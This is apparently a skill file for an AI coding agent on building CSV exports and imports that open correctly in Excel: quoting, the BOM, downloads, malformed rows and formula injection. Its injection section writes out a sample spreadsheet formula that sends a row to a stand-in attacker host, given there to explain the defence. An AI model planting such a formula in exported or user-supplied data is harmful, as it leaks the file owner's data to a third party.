---
name: csv-and-data-export
description: CSV that survives Excel — quoting, the BOM, the download blob, bad rows, and formula injection
when: Paste, import, upload, parse, export or download a CSV or spreadsheet the user will open in Excel
---

# CSV and data export

"Download it as a spreadsheet" is one of the most-requested features in this
product and one of the least-verified. A CSV export is trivially easy to make
*look* done — there is a button, it downloads a file — and the file is broken.

## ⚠️⚠️ The shipped bug this file exists to stop

A generated landing page built its signup export like this:

```js
const csv = 'Email\\n' + emails.map(e => e.address).join('\\n');   // BROKEN
```

The escaping level was wrong by one, so the file contained the literal
characters `\n` and arrived as **a single line**. Every address landed in one
spreadsheet cell; the lead list was unusable. It scored full marks, because a
probe can see a `download` attribute and cannot see a newline.

⭐ **Produce the file and read it back. Count the lines.** A CSV export you have
not opened is not a feature, it is a button.

⚠️ The same class of error, from the same run, in HTML:
`<input pattern="\\d{5}">` — the compiled regex is a backslash followed by five
`d`s, so the field can never validate and the order can never be placed. **Every
time a string crosses a language boundary — JS into a file, JS into an HTML
attribute — check the escaping level at that boundary specifically.**

## ⚠️ `split(',')` is not a CSV parser

`Smith, John` is one field. `He said "hi"` contains quotes. An address contains
newlines. RFC 4180: a field containing a comma, a double quote or a line break
is wrapped in double quotes, and an embedded `"` is written as `""`.

**Emitting, correctly, in five lines:**

```js
const cell = (v) => {
  const s = v == null ? '' : String(v);
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
};
const csv = [cols.join(','), ...rows.map(r => cols.map(c => cell(r[c])).join(','))]
  .join('\r\n');
```

CRLF is what RFC 4180 specifies and what older Excel prefers; bare `\n` is fine
everywhere modern. Pick one and be consistent.

**Parsing:** for anything beyond your own emitted data, a quoted field with an
embedded newline means you cannot split the file into rows by line at all. Write
a character-scanning parser or use a library. If you split on lines, say in the
code comment that quoted newlines are not supported — do not let it be silent.
The shelf's library is `Papa` (tag in `vendor-shelf`):

- **Papa** reads/writes CSV. ⚠️ `{ header: true }` or rows are arrays; with a
  `File` it is ASYNC and returns undefined — use the `complete` callback.

## ⚠️⚠️ The BOM, or Excel mangles every non-ASCII name

Excel on Windows opens a UTF-8 `.csv` as the system code page unless the file
begins with the byte-order mark. `Müller` arrives as `MÃ¼ller` and the user
reports the export as broken.

```js
const blob = new Blob(['\uFEFF' + csv], { type: 'text/csv;charset=utf-8;' });
```

On import, strip a leading `\uFEFF` before you read the first header — otherwise
the first column is named `"\uFEFFdate"` and never matches.

## ⚠️⚠️ CSV injection is a real vulnerability, not a nicety

A cell beginning `=`, `+`, `-`, `@`, tab or carriage return is a **formula** to
Excel and Google Sheets. `=HYPERLINK("http://evil/?"&A1,"click")` in a signup
name exfiltrates the row when the owner opens their own export.

```js
const safe = (s) => /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;   // apply before `cell()`
```

⭐ The export of user-submitted data — a signup list, an enquiry form, a review
— is exactly the case where the content is attacker-supplied. That is the case
this always is.

## The download, all of it

```js
const url = URL.createObjectURL(blob);
const a = Object.assign(document.createElement('a'), { href: url, download: 'signups.csv' });
document.body.appendChild(a);
a.click();
a.remove();
URL.revokeObjectURL(url);        // ⚠️ or the blob is held for the life of the page
```

⚠️ **The click must happen inside the user's own gesture.** A download triggered
after an `await` — fetch the rows, then download — can be blocked as a popup.
Gather the data first, then create and click in the handler.

⚠️ `download` is same-origin only; it is ignored on a cross-origin `href` and
the browser navigates instead.

## Import: the parts that are always missed

```js
const text = await file.text();        // simpler than FileReader, returns a Promise
const lines = text.replace(/^\uFEFF/, '').split(/\r\n|\n|\r/);
```

Split on all three line endings — a Mac-classic export uses bare `\r`.

⚠️ **A malformed row must not kill the import.** Our own brief says it in words:
*"Handle a malformed row without crashing."* Parse each row inside its own
`try`, collect the failures with their row numbers, and **show the user**
"3 of 412 rows skipped (rows 17, 204, 388)". Silently dropping rows is worse
than crashing, because the totals are then quietly wrong and nobody knows.

**Every CSV value is a string.** At the boundary:

- `Number('')` is `0` and `Number('1,200')` is `NaN` — see `money-and-totals`.
- Leading zeros (`00412`) and anything past 15 digits (a card or account number)
  **must stay text**. Parse them to a Number and you lose the zeros, and past
  2^53 you lose the last digits with no error.
- Match headers case-insensitively and trimmed; report the columns you looked
  for and did not find, rather than reading `undefined` into every row.

## ⚠️ Do not substitute a different format

If the ask is a spreadsheet, a JSON download is not it, and neither is a
`<pre>` block on screen. If a real `.xlsx` is required (multiple sheets,
formatting, formulas) say that CSV cannot carry it rather than shipping a CSV
named `.xlsx` — Excel will refuse to open that.

## Before calling it done

- [ ] Download the file and open it. Count the rows; check the last one.
- [ ] One row contains a comma, one a quote, one a non-ASCII name.
- [ ] Round-trip it: export, re-import, and the record count matches.
- [ ] A row starting with `=` is neutralised.
- [ ] A deliberately broken row produces a visible, counted skip.

Related: `money-and-totals` (numbers off a CSV), `data-and-charts` (what to do
with them), `forms-and-validation` (the input side), `security-review`.
